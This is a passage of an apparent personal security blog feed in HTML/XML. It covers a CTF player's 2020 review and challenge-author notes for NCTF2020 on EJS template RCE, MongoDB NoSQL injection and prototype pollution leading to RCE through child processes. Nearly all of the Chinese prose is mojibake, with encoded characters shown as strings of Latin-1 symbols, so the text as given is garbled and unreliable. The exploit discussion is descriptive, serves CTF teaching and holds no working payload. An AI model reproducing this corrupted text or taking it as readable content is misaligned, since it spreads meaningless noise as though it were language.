oooooldjsè¿™é¢˜æŒºå¯¹æˆ‘èƒƒå£çš„ã€‚æˆ‘å½“æ—¶è°ƒè¯•äº†å¥½ä¹…ä¹Ÿæ˜¯æ‰¾åˆ°äº†åŸå‹é“¾æ±¡æŸ“çš„åœ°æ–¹å´æ²¡æ³•æ±¡æŸ“ï¼Œå§‹ç»ˆæ²¡æ‰¾åˆ°bypassçš„æ–¹æ³•ã€‚ç»“æœèµ›åæ²¡æƒ³åˆ°æ±¡æŸ“è¿˜åªæ˜¯è¿™é¢˜çš„ç¬¬ä¸€æ­¥orz.</p><p>ä¹‹åæ˜¯è¥¿æ¹–è®ºå‰‘çš„çº¿ä¸‹ï¼Œæ¬¢è¿å¦¹å­æ‰“ç”µè¯å†æ¬¡å‡ºæˆ˜</p><p><img src="https://i.imgur.com/pY3thoy.jpg" class="lazyload" data-srcset="https://i.imgur.com/pY3thoy.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>fmyy yyds.ç¥¥å“¥ yyds. ç›´æ¥æ‰“åˆ°ç¬¬7è„±ç¦»ä½ä¿ã€‚ç„¶åå¤§è…¿åœ¨ç™½æ³½å¤ºå† ï¼Œylg+éª‘é©´ä»–ä»¬huashuiteam ç¬¬äºŒã€‚æˆ‘ä»¬ç¬¬7,x1cæœ‰ä½ä¿ã€‚rrråœ¨ioté‚£ä¹Ÿæ‹¿äº†é’±ã€‚æ„Ÿè§‰æ–°/è€ç»¿è‰æŠ¢äº†ä¸å°‘é’± 2333</p><p>å›å¤´å¤ç°äº†ä¸‹æ²¡åšå‡ºæ¥çš„web,æ„Ÿè§‰å…¶å®ä¸éš¾ï¼Œä½†æ˜¯è°ƒè¯•è¿˜æ˜¯æŒºé‡è¦çš„ã€‚</p><p>ç„¶ånctf2020 æˆ‘å‡ºé¢˜ã€‚å…¶å®é™¤å¼€å›½èµ›ä»¥å¤–è‡ªå·±åŸºæœ¬å°±æ²¡æ€ä¹ˆæŠŠå‡ºå¥½çš„é¢˜å–ç»™å…¶ä»–å¹³å°ã€‚å› ä¸ºæˆ‘è§‰å¾—é«˜è´¨é‡çš„é¢˜æœ€å¥½èƒ½æ”¾è‡ªå·±å®¶çš„æ¯”èµ›ï¼Œæ¥åˆ†äº«çŸ¥è¯†ã€‚æ¯•ç«Ÿctfçš„ç›®çš„ä¸€ä¸ªæ˜¯have funï¼Œå¦ä¸€ä¸ªå°±æ˜¯èƒ½ä»é¢˜ç›®ä¸­æ”¶è·ä¸€äº›å¯¹ç°å®çœŸå®ç¯å¢ƒåˆ©ç”¨çš„æ–¹æ³•ã€‚å› ä¸ºå¾ˆé•¿ä¸€æ®µæ—¶é—´è‡ªå·±ä¸»è¦æ˜¯ç ”ç©¶nodejs,æ‰€ä»¥å°±æŠŠè¿™äº›æˆ‘è‡ªæˆ‘è®¤ä¸ºèƒ½è®©äººæœ‰æ‰€æ”¶è·çš„çŸ¥è¯†ç‚¹éƒ½æ”¾åœ¨æ ¡èµ›äº†ã€‚ï¼ˆå­¦é•¿ä»¬çš„å¥–åŠ±å¤ªä¸°åšäº†ã€‚ã€‚ã€‚ï¼‰<br>è€Œä¸”ç¡®å®ï¼Œä»å¸ˆå‚…ä»¬åšæˆ‘çš„é¢˜çš„è¿‡ç¨‹ä¸­æˆ‘ä¹Ÿçœ‹åˆ°ä¸€äº›å¾ˆæœ‰æ„æ€çš„ç‚¹ï¼ŒåŒ…æ‹¬ä¸€äº›éé¢„æœŸã€‚</p><p>ä¸¾ä¸ªä¾‹å­ã€‚package_managerä¸¤é“é¢˜æœ¬æ„æ˜¯åŸå‹é“¾æ±¡æŸ“æ‰“å­è¿›ç¨‹ã€‚ä¸è¿‡æœ‰äº›å¸ˆå‚…æ˜¯é æ—¥nunjucksåšå‡ºæ¥çš„ã€‚ç¡®å®æé†’äº†æˆ‘ä¸è¦ç›²ç›®ä¸è·Ÿæºç å°±é€‰æ¡†æ¶ã€‚æ›´æ„å¤–çš„æ˜¯æˆ‘ä»¬njuptçš„å¼€å‘dalaoç›´æ¥å¸®å¿™ä¿®å¤äº†è¿™ä¸ªé—®é¢˜233.è™½ç„¶ä¸æ˜¯0dayï¼Œä½†æ˜¯çš„ç¡®è§£å†³æ‰äº†nunjucksæ¨¡æ¿æ³¨å…¥çš„ä¸€ç§åˆ©ç”¨ã€‚</p><p><img src="https://i.imgur.com/ravy0uK.png" class="lazyload" data-srcset="https://i.imgur.com/ravy0uK.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ€ååˆ°äº†12æœˆï¼Œxnucaçº¿ä¸‹<br><img src="https://i.imgur.com/rmUrdsx.jpg" class="lazyload" data-srcset="https://i.imgur.com/rmUrdsx.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ¬æ¥æ˜¯æ‰“ç®—è¿‡å»æ¸—é€çš„ã€‚å¼€å§‹è¿˜æ‹…å¿ƒå·¥å…·æ˜¯ä¸æ˜¯æ²¡å‡†å¤‡å¥½ï¼Œç»“æœç°åœºçœ‹åˆ°èµ›åˆ¶ç›´æ¥å˜æˆå¼ºç½‘æ¯åŒæ¬¾git based AWD + KOHäº†ã€‚è€Œä¸”awdè¿˜æœ‰ä¸€åŠï¼ˆ2/4ï¼‰å…¶å®å°±æ˜¯è§£é¢˜â€¦â€¦<br>åªèƒ½è¯´çœŸçš„ç¡¬æ ¸ï¼Œæ€»å…±å°±ä¸€é“è§£é¢˜webã€‚å…¶ä»–çš„éƒ½æ˜¯ç¡¬æ ¸pwn. ezwpæ€è·¯é”™äº†å°±ä¸€è„¸æ‡µé€¼ã€‚åé¢çŸ¥é“æ˜¯pharååºåˆ—åŒ–åæ„Ÿè§‰è¿˜è¡Œï¼Ÿæ€»ä¹‹è°ƒäº†ä¸‹æ”¶è·æŒºå¤§çš„ã€‚ä¸è¿‡ç¡®å®æ„Ÿè§‰å¾—åˆ°è°ƒè¯•wordpressè¿™ç§æ¡†æ¶æºç æ¯”é‚£äº›æ¯”è¾ƒæ°´çš„cmséš¾å¤ªå¤šäº†ã€‚æ‰€ä»¥åé¢è‚¯å®šè¦ç ”ç©¶ä¸‹çš„ã€‚<br>å½“ç„¶é…’åº—çš„è‡ªåŠ©åƒçš„çœŸèˆ’æœã€‚fmyyè·Ÿpsbç–¯ç‹‚å¹²é¥­ï¼Œfmyyå›æ¥ç§°ä½“é‡ç›´æ¥èƒ–äº†7æ–¤233</p><p>ç„¶åå›å—äº¬å‘†äº†ä¸€å¤©å°±åˆå»åŒ—äº¬æ‰“å­—èŠ‚äº†</p><p><img src="https://i.imgur.com/GEjE7Iv.jpg" class="lazyload" data-srcset="https://i.imgur.com/GEjE7Iv.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å•åˆ·äº†ä¸‰é“ctf webã€‚å¯æƒœå…¶ä»–æ–¹å‘éƒ½ä¸ä¼šï¼Œç›´æ¥ggã€‚adç¬¬äºŒå¤©é fmyyçš„ä¸€è¡€æ€»ç®—ä¸æ˜¯å¤ªéš¾çœ‹ã€‚ç„¶åå°±æ²¡æœ‰ç„¶åäº†ï¼Œåˆæ˜¯è¢«miscæ”¯é…çš„æ—¥å­orz</p><p>ä¸è¿‡å­—èŠ‚ç¡®å®æœ‰é’±ã€‚æ¥ä¹‹å‰çš„é›¶é£Ÿå¤§ç¤¼åŒ…è·Ÿæ¯”å®Œåçš„å¤§ç¤¼åŒ…çœŸçš„ä¸°åšã€‚ã€‚ã€‚è€Œä¸”æŠ¥é“é‚£å¤©æ™šä¸Šé€›çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†è®¡ç®—æ‰€/ç‰©ç†æ‰€/ç©ºå¤©ä¿¡æ¯ç ”ç©¶æ‰€ï¼Œä»¥åŠä¸€äº›äº’è”ç½‘å¤§å‚ã€‚åªèƒ½æ„Ÿæ…¨å¸éƒ½ç¡®å®æ˜¯å¸éƒ½ï¼Œå¤§å‚äº‘é›†ã€‚ä¹Ÿè®¸ä»¥åä¹Ÿæœ‰è¿‡å»å‘å±•çš„æ„æ„¿</p><p>æ‰“å®Œå­—èŠ‚å°±å†³å®šè¯¥æš‚æ—¶é€€å½¹äº†ã€‚ç»“æœä¸€å‘¨åæ‰‹ç—’è¿˜æ˜¯æ‰“äº†huaweiCTFçš„ç¬¬ä¸€åœºï¼Œwebå·®ä¸€é¢˜ak.æœç„¶è¿˜æ˜¯tcl.ä¹Ÿå¯èƒ½æ˜¯å•åˆ·webçš„è¯è„‘å­é¡¶ä¸ä½å§ï¼Œæ²¡æƒ³åˆ°cloudé‚£é¢˜æŒ‚å¥½ä»£ç†æ˜¯æ‰“fpm <del>æ‰€ä»¥åä¸¤åœºå°±ä¸æ‰“äº†ã€‚æ¯•ç«Ÿè¿˜è¦å¤ä¹ æ¥ç€.</del> ä¹‹åæ‰‹ç—’è¿˜æ˜¯çœ‹äº†åä¸¤åœºï¼Œé™¤äº†æœ€åä¸€åœºçš„ezloginéƒ½åšå‡ºæ¥äº†ï¼ŒåŸºæœ¬éƒ½æ˜¯å‰å‡ solve.çœ‹æ¥ç°åœ¨è§£é¢˜çš„çŠ¶æ€è¿˜ä¸é”™ï¼Ÿä½†æ˜¯è¯¥é€€å½¹è¿˜æ˜¯å¾—é€€å½¹çš„</p><p>çš„ç¡®å¯ä»¥è¯´ï¼Œ2020å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯åœ¨è·Ÿctfæ‰“äº¤é“ã€‚æˆ‘å¾ˆé«˜å…´èƒ½å¤Ÿé€‰æ‹©è¿™æ¡è·¯å¹¶ä¸”å‚ä¸å…¶ä¸­ã€‚æ— è®ºåšé¢˜/å‡ºé¢˜/ç ”ç©¶/è°ƒè¯•æŸä¸ªæ¼æ´çš„è¿‡ç¨‹ï¼Œéƒ½æ˜¯å……æ»¡è¶£å‘³çš„ã€‚é‡è¦çš„æ˜¯å­¦åˆ°äº†çŸ¥è¯†ï¼Œè¿™æ ·æ‰ä¸è‡´äºæ¯å¤©ç¢Œç¢Œæ— ä¸ºï¼Œæµªè´¹å¤§å­¦çš„å¤§å¥½æ—¶å…‰ã€‚æœ‰æ—¶å€™è™½ç„¶æ„Ÿè§‰å¿ƒé‡Œä¸å¹³è¡¡ï¼Œå› ä¸ºä¸ºç«èµ›ä»˜å‡ºçš„åŠªåŠ›æ‰€å¸¦æ¥çš„æˆæœå¹¶ä¸èƒ½ä¸å…¶ä»–åŒå­¦ä¾é å¯¼å¸ˆæ‰€æ‹¿åˆ°çš„ç§‘ç ”æˆæœç›¸æå¹¶è®ºã€‚ä½†æ˜¯è¿™ç§ä¸å¹³è¡¡åªæ˜¯æš‚æ—¶çš„ï¼Œæ—¢ç„¶é€‰æ‹©äº†è¿™æ¡è·¯ï¼Œå°±æ²¡æœ‰æ€€ç–‘å…¶æ­£ç¡®æ€§çš„å¿…è¦äº†ã€‚åšæŒèµ°ä¸‹å»å°±å¥½</p><p>å½“ç„¶2020è¿˜æ˜¯æœ‰äº›å°é—æ†¾çš„ï¼Œæ¯”å¦‚æŸäº›æ¯”èµ›æ²¡èƒ½å†²åˆ°å‰åˆ—ï¼Œæ¯”å¦‚å­¦ä¸šä¸Šæœ‰å‡ é—¨è€ƒè¯•ä¸å¤ªæ»¡æ„ï¼Œæ¯”å¦‚è¿˜æ˜¯ç»§ç»­å•èº«ç”Ÿæ´»ï¼ˆææ€•æœ¬ç§‘ç”Ÿæ¶¯è„±ä¸äº†å•äº†ï¼‰,æ¯”å¦‚æ²¡èƒ½åšæŒé”»ç‚¼â€¦â€¦ å¸Œæœ›æ˜å¹´èƒ½æœ‰æ‰€æ”¹è¿›å§ã€‚</p><p>æ€»çš„æ¥è¯´2020è¿˜æ˜¯æ”¶è·æ»¡æ»¡çš„ã€‚æ¯•ç«Ÿå›é¦–ä¸€çœ‹ï¼Œè‡ªå·±ä½œä¸ºä¸€åctferçš„ç¡®æ˜¯ä»ä¸€æ— æ‰€çŸ¥åˆ°èƒ½æœ‰æ‰€è¾“å‡ºäº†ã€‚äººæ€»å½’æ˜¯è¦è¿›æ­¥çš„ï¼Œä»˜å‡ºæœ‰å›æŠ¥æ‰æ˜¯æˆ‘ä¸ªäººçš„ä¿¡æ¡ã€‚æ‰€ä»¥æ¥ä¸‹æ¥çš„ä¸€å¹´ä¹Ÿè¦ç»§ç»­åŠªåŠ›ï¼Œå®Œæˆè‡ªå·±æœ€åçš„å­¦æœ¯æ¢¦æƒ³å§ XP</p><p>ä¹‹å‰çœ‹åˆ°éå¸¸å´‡æ‹œçš„æ—¥æœ¬å¸ˆå‚…å†™ä¸‹çš„è‡ªçœä¸æŠ±è´Ÿï¼Œè®©æˆ‘è§‰å¾—æ¥ä¸‹æ¥ä¹Ÿéœ€è¦æœ‰è§„åˆ’çš„è¡ŒåŠ¨ã€‚</p><p>2020çš„åçœï¼š</p><ul><li>äººå˜å¾—æ‡’æƒ°äº†ï¼Œä¹Ÿè®¸æ˜¯ç–«æƒ…çš„å½±å“ï¼Œä½†æ˜¯ç¡®å®å½±å“äº†æ•ˆç‡</li><li>å­¦golangï¼Œä»¥åŠå†™ä¸€äº›javaé¡¹ç›®çš„flagæ²¡æœ‰æ‹”æ‰</li><li>é”»ç‚¼å°‘äº†ï¼Œå°‘äº†è·‘æ“åå…‰é æ‰“ç¯®çƒä»ç„¶ä¼šæ„Ÿå—åˆ°èº«ä½“æœºèƒ½çš„å¤§å¹…ä¸‹é™</li><li>å»å›¾ä¹¦é¦†å°‘äº†ï¼Œçœ‹ä¹¦æœ¬å­¦ä¹ çš„å¿ƒæ€å˜å¾—æµ®èº</li><li>ä¸Šè¯¾æ‘¸é±¼å¤ªå¤šï¼ˆæ°´è¯¾é™¤å¤–ï¼‰</li></ul><p>2021çš„æŠ±è´Ÿï¼š</p><ul><li>å¼€å‘ï¼štypescripté¡¹ç›®çš„å®Œæˆï¼Œgolangçš„å­¦ä¹ ,javaçš„è¿›ä¸€æ­¥å­¦ä¹ </li><li>ç®—æ³•ï¼šåˆ·leetcode</li><li>é”»ç‚¼ï¼šä¿è¯èº«ä½“å¥åº·ï¼Œäº‰å–å®šæœŸé•¿è·‘ä¸€æ¬¡</li><li>ç§‘ç ”: äº‰å–èƒ½æœ‰æ‰€äº§å‡ºï¼Œè‡³å°‘ä¸è¦åšåˆ°æ¯«æ— è¿›å±•</li><li>å°è¯•ä¸€äº›å¤æ‚çš„æ¼æ´è„šæœ¬ç¼–å†™ï¼Œä¸Šçº¿åˆ°github</li><li>ä¿ç ”åˆ°å¿ƒä»ªçš„é™¢æ ¡</li><li>å¦‚æœæˆäº†ï¼Œä¸‹åŠå¹´å†²å„ç§CTF</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2020-å‡ºé¢˜å°è®°</title>
      <link href="2020/11/11/NCTF2020-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
      <url>2020/11/11/NCTF2020-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/%E6%80%BB%E6%A6%9C.png" class="lazyload" data-srcset="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/%E6%80%BB%E6%A6%9C.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><a id="more"></a><p>nctf2020ç»ˆäºç»“æŸäº†ã€‚æˆ‘æ‰‹å¤´çš„é¢˜ç›®ä¹ŸåŸºæœ¬æ— äº† XD<br>å› ä¸ºè¿™æ¬¡nctfå­¦é•¿ä»–ä»¬è¦æ¥çš„å¥–åŠ±æŒºä¸°åšçš„(xray licenseæˆ‘ä¹Ÿæƒ³è¦å•Š),æ‰€ä»¥å°±æŠŠæ‰‹å¤´çš„é¢˜éƒ½æ”¾å‡ºæ¥äº†ã€‚å¦‚æœéš¾åº¦å¯¹æ–°ç”Ÿæœ‰äº›åŠé€€çš„è¯è¿˜è¯·å¤šå¤šåŒ…æ¶µã€‚æ ¡èµ›å‰å‡ å¤©ï¼Œç”šè‡³ä»¥ä¸ºyyplè¦æ¥å°±ä¸´æ—¶èµ¶å‡ºäº†ä¸€é“bg_laravel,ç»“æœè¢«å¿½æ‚ äº†ã€‚æœ€åå¤§éƒ¨åˆ†å¸ˆå‚…å¯èƒ½éƒ½å»åšç¥¥äº‘æ¯äº†ï¼Œæ‰€ä»¥æ²¡èƒ½è¿‡æ¥æ‰“ï¼Œç®—æ˜¯æ¯”è¾ƒå¯æƒœäº†ã€‚</p><p>è¿™æ¬¡æˆ‘çš„é¢˜ç›®é™¤äº†bg_laravelä»¥å¤–å…¨éƒ½æœ‰äººè§£å‡º.(rmbå¸ˆå‚…è¿˜æœ‰å…¶ä»–å¸ˆå‚…tql)é¢˜ç›®ç¯å¢ƒæ”¾githubä¸Šäº†,å¯ä»¥è‡ªå–å¤ç°ã€‚<br><a href="https://github.com/baiyecha404/My-NCTF2020-Challs" target="_blank" rel="noopener">https://github.com/baiyecha404/My-NCTF2020-Challs</a></p><h2 id="JS-world-11-solves"><a href="#JS-world-11-solves" class="headerlink" title="JS-world [11 solves]"></a>JS-world [11 solves]</h2><p>è¿™é“æ˜¯ä¸“é—¨ä¸ºæ ¡èµ›å‡†å¤‡çš„ç­¾åˆ°é¢˜ç›®ã€‚æ•´ä½“æ€æƒ³ä¸Šå…¶å®å°±æ˜¯æƒ³å±•ç¤ºä¸‹jsåœ¨å‰åç«¯çš„é€šç”¨æ€§ã€‚åªè¦ç†è§£äº†å‰ç«¯æºç å°±èƒ½æ¨æ–­åç«¯é€»è¾‘ã€‚åŒæ—¶ä¹Ÿæƒ³è¯´æ˜å‰ç«¯çš„wafç­‰äºæ²¡æœ‰waf :).åŠ ä¸Š<code>powered by ejs</code>çš„æç¤º,åº”è¯¥ä¸éš¾çœ‹å‡ºç”¨çš„æ˜¯ejsæ¥æ¸²æŸ“htmlä»£ç ã€‚é‚£ä¹ˆç›´æ¥ç”¨ejsçš„è¯­å¥å°±å¯ä»¥RCEäº†.</p><p>æ¯”èµ›çš„æ—¶å€™æœ¬æ¥ä¸€è¡€å¾ˆå¿«å°±å‡ºäº†çš„ï¼Œç»“æœåæ¥åŠå¤©æ²¡äººè§£ã€‚æˆ‘çœ‹äº†çœ¼htmlå‘ç°æœ‰çš„å¸ˆå‚…å·²ç»å¯ä»¥RCEäº†ç»“æœå°±æ˜¯ä¸å»çœ‹æ ¹ç›®å½•çš„flag.txt.é˜¿è¿™â€¦â€¦</p><h2 id="Mango-3-solves"><a href="#Mango-3-solves" class="headerlink" title="Mango [3 solves]"></a>Mango [3 solves]</h2><p>Mango è‡ªç„¶æ˜¯ä¸ºäº†ç©ä¸€ä¸ªmongo &lt;-&gt; mangoçš„æ¢—ã€‚è¿™é“é¢˜çš„èµ·æºæ¯”è¾ƒæœ‰æ„æ€ï¼Œæ¥è‡ªäºä¸ŠåŠå¹´æŸå›½é™…èµ›çš„èµ›é¢˜ã€‚å½“æ—¶é¢˜ç›®è€ƒç‚¹æ˜¯node-serializeçš„ååºåˆ—åŒ–,ä¸è¿‡æˆ‘åœ¨é»‘ç›’æµ‹çš„æ—¶å€™æ„å¤–å‘ç°é‚£é“é¢˜ç›®è¿˜æœ‰nosqlæ³¨å…¥çš„æ¼æ´å­˜åœ¨ã€‚äºæ˜¯åæ¥getshellåç´¢æ€§dumpæºç ä¸‹æ¥ç ”ç©¶äº†ä¸‹ï¼Œä¹Ÿå¤§è‡´æ˜ç™½äº†ä¸ºä»€ä¹ˆä»–çš„é…ç½®ä¼šäº§ç”Ÿnosqlæ³¨å…¥ã€‚åŠ ä¸Šåæ¥å‘ç°è¿™æ ·çš„ä»£ç å†™æ³•å…¶å®è¿˜æŒºå¸¸è§çš„ï¼Œæ‰€ä»¥å¹²è„†å•ç‹¬å‰¥å‡ºæ¥åšæˆnosqlæ³¨å…¥äº†ã€‚</p><p>ä½†æ˜¯æˆ‘çš„å®šä½åªæ˜¯ä¸­ç­‰éš¾åº¦ï¼Œæœ€ååªæœ‰3 solvesæˆ‘ä¹Ÿå¾ˆè¿·ã€‚ä¸çŸ¥é“æ˜¯å› ä¸ºå¤§å®¶æ²¡æœ‰æ¥è§¦è¿‡nosqlæ³¨å…¥è¿˜æ˜¯ä»€ä¹ˆçš„ã€‚æˆ‘ç°åœ¨è§è¿‡çš„å¤§éƒ¨åˆ†nodejså†™çš„é¡¹ç›®æ•°æ®åº“éƒ½æ˜¯ç”¨çš„mongodb,æ„Ÿè§‰å‡ºç°nosqlçš„æ¦‚ç‡è¿˜æ˜¯ä¸å°çš„ã€‚ç¨å¾®éœ€è¦æ›´æ¢æ–¹å¼fuzzçš„åœ°æ–¹å°±æ˜¯jsonä¼ é€’æ•°æ®äº†ã€‚è¿™ä¸ªä¹Ÿç®—æ˜¯æ¯”è¾ƒå¸¸è§çš„trickå§,nodeç”±äºä¼ é€’jsonå¯¼è‡´ä¸å¯¹è±¡æ··æ·†çš„é—®é¢˜ç®€ç›´ä¸è¦å¤ªå¤šã€‚æ‰€ä»¥ç¬¬äºŒä¸ªæç¤ºç»™å‡ºäº†<code>app.use(express.json())</code>ã€‚æ‰‹æŠ–åŠ ä¸€ä¸ªjsonä¸­é—´ä»¶æˆ–è€…å› ä¸ºæŸä¸ªéœ€æ±‚ä¸å¾—ä¸åŠ ä¸­é—´ä»¶(å†™apiæ—¶),å¾ˆæœ‰å¯èƒ½å¸¦æ¥å¥‡æ€ªçš„é—®é¢˜ã€‚æ‰€ä»¥å†™nodeä¼ å‚ä¸€å®šè¦è®°å¾—ç±»å‹æ£€æŸ¥å•Šã€‚</p><h2 id="PackageManager-v1-0-v2-0-7-solves-3-solves"><a href="#PackageManager-v1-0-v2-0-7-solves-3-solves" class="headerlink" title="PackageManager v1.0/v2.0 [7 solves / 3 solves]"></a>PackageManager v1.0/v2.0 [7 solves / 3 solves]</h2><p>PackageManager ç³»åˆ—æ”¾äº†ä¸¤é“é¢˜ã€‚å…¶å®æºç åŸºæœ¬ç›¸å·®ä¸å¤§ï¼Œ2å°±æ˜¯1çš„å‡çº§ç‰ˆã€‚ä¸€å¼€å§‹çš„PackageManager 6æœˆä»½å°±å‡ºå¥½äº†ã€‚ä¸è¿‡åæ¥è¿‡äº†å‡ ä¸ªæœˆåæ„å¤–å‘ç°å±…ç„¶å­˜åœ¨éé¢„æœŸã€‚äºæ˜¯ç´¢æ€§å°±æŠŠéé¢„æœŸæ”¾åˆ°ç¬¬äºŒç‰ˆé‡Œå¹¶ä¸”åŠ éš¾äº†ã€‚è€ƒç‚¹å…¶å®æ˜¯æˆ‘è§‰å¾—å¾ˆå€¼å¾—å»å­¦ä¹ çš„ç”¨å­è¿›ç¨‹æ¥<code>prototype pollution to RCE</code>çš„ä¸€ç§æ‰‹æ®µ.ç›¸æ¯”æ·±æŒ–æ¨¡æ¿æ±¡æŸ“å±æ€§çš„åˆ©ç”¨æ–¹æ³•ï¼Œå­è¿›ç¨‹å¯¼è‡´RCEç®—æ˜¯å¤§å¤§é™ä½äº†åˆ©ç”¨éš¾åº¦ã€‚ç„¶è€Œå›½å†…ç›¸å…³æ–‡ç« è²Œä¼¼ä¸»è¦æ˜¯å…ˆçŸ¥ä¸Šçš„ä¸€ç¯‡kibana cveåˆ†æ,ä¸è¿‡å°±å­è¿›ç¨‹åˆ©ç”¨èŒƒå›´ä¸Šæœ‰äº›å·®é”™ã€‚æ‰€ä»¥å¸Œæœ›å€Ÿæ­¤è®©å¤§å®¶é‡æ–°å…³æ³¨ä¸‹ã€‚</p><p>å½“ç„¶ï¼Œåæ¥æ„å¤–å‘ç°è¿™ä¸ªè€ƒç‚¹ç¬¬5ç©ºé—´çº¿ä¸‹è²Œä¼¼ä¹Ÿå‡ºç°è¿‡,ä¸è¿‡æˆ‘é¢˜ç›®å…ˆå‡ºå¥½çš„233ã€‚</p><p>v2é™¤äº†è¾¾æˆRCEä»¥å¤–,ä¸ºäº†å¢åŠ ä¸€ç‚¹éš¾åº¦ï¼Œç‰¹æ„å°±æŠŠflagæ”¾åˆ°mongodbä¸­äº†ã€‚è¿™ç‚¹æ ¹æ®hint.txtä»¥åŠç›®å½•ä¸‹çš„æ–‡ä»¶æ¥æ¨æ–­åº”è¯¥ä¸æˆé—®é¢˜ã€‚å…¶å®ç›®çš„æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªå¼€å‘ä¸Šçº¿åˆ°ç”Ÿäº§ç¯å¢ƒçš„æƒ…æ™¯ã€‚æ¯”å¦‚åƒæˆ‘è¿™æ ·,å®¹æ˜“è£…äº†æŸä¸ªä¾èµ–å†™ä¸ªdemoï¼Œç„¶åå­—æ®µç•™åˆ°package.jsoné‡Œäº†,æœ¬åœ°åˆ äº†ç›¸å…³jsä»£ç åæ‹¿åˆ°ç”Ÿäº§ç¯å¢ƒä¸‹ç›´æ¥<code>npm install</code> ,å°±å¤šè£…äº†æ²¡æœ‰ç”¨çš„ä¾èµ–ã€‚æ‰€ä»¥è¿™é‡Œå°±èƒ½ç”¨mongodbä¾èµ–è¿æ¥å†…ç½‘mongodbæ‹¿flag.</p><p>ç„¶åæ¯”èµ›å°±ç¿»è½¦äº†â€¦â€¦nunjucksæŠŠæˆ‘ç»™å®³äº†ã€‚ä¹‹æ‰€ä»¥é€‰nunjucksåšæ¨¡æ¿å¼•æ“æœ¬æ¥æ˜¯å› ä¸ºæˆ‘æ‰€çŸ¥é“çš„å¼•æ“é™¤äº†nunjuckså¤–ï¼Œåƒhbs,ejs,pug,jadeéƒ½æ˜¯å¯ä»¥æ±¡æŸ“æ¨¡æ¿RCEçš„ã€‚æ‰€ä»¥æ²¡æœ‰è·Ÿæºç å°±ç›´æ¥æƒ³çœ‹çœ‹æœ‰æ²¡æœ‰äººéé¢„æœŸæ±¡æŸ“nunjuckså±æ€§çš„ï¼ˆp1g3å¸ˆå‚…åº”è¯¥æ˜¯æ‰¾äº†nunjucksçš„æ±¡æŸ“ï¼Œä½†æ˜¯åªèƒ½ç­‰æˆ‘é¶æœºæ¯åˆ†é’Ÿé‡å¯æ‰èƒ½çœ‹ä¸€æ¬¡æ‰§è¡Œç»“æœ,æ²¡æœ‰é¢„æœŸè§£æ–¹ä¾¿ï¼‰ã€‚ç»“æœå‘ç°nunjucksç›´æ¥æ¨¡æ¿æ³¨å…¥æ ¹æœ¬ä¸å—è¿™äº›å½±å“â€¦â€¦ æˆ‘v2æœ¬æ¥ç›®çš„å°±æ˜¯è¯´æ˜å…¶å®ä¸æ­¢fork,ä»»æ„å­è¿›ç¨‹éƒ½å¯ä»¥ç»“åˆæ±¡æŸ“ç¯å¢ƒå˜é‡ç„¶åRCE,æ‰€ä»¥å°±ç”¨äº†<code>execSync(&#39;whoami&#39;)</code>ã€‚ä¸­é—´ä»¶é‡Œè¿˜è€ƒå¯Ÿäº†ä¸€ä¸ªtrickç»•è¿‡debugè·¯ç”±çš„é™åˆ¶.ç»“æœæ¨¡æ¿æ³¨å…¥ç›´æ¥é€šæ€v1,v2 orz</p><p>ä¸è¿‡è²Œä¼¼çœ‹v2çš„äººä¸å¤šï¼Œæ‰€ä»¥æœ€årmbè·Ÿp1g3å¸ˆå‚…åº”è¯¥æ˜¯é¢„æœŸåšçš„ã€‚ä¸€è¡€çš„Somnuså¸ˆå‚…å°±ç›´æ¥éé¢„æœŸæ¨¡æ¿æ³¨å…¥äº†â€¦â€¦ä¸è¿‡éé¢„æœŸä»€ä¹ˆçš„æ— æ‰€è°“,èƒ½æ‹¿flagéƒ½æ˜¯å¥½æ–¹æ³•,å¤§å®¶èƒ½å­¦åˆ°å­è¿›ç¨‹æ±¡æŸ“çš„çŸ¥è¯†æˆ‘å°±æ¯”è¾ƒæ»¡è¶³äº†ã€‚æœ€åæ¯”è¾ƒæ™®éçš„é—®é¢˜æ˜¯æœ‰çš„å¸ˆå‚…è¿æ¥mongodbä»£ç 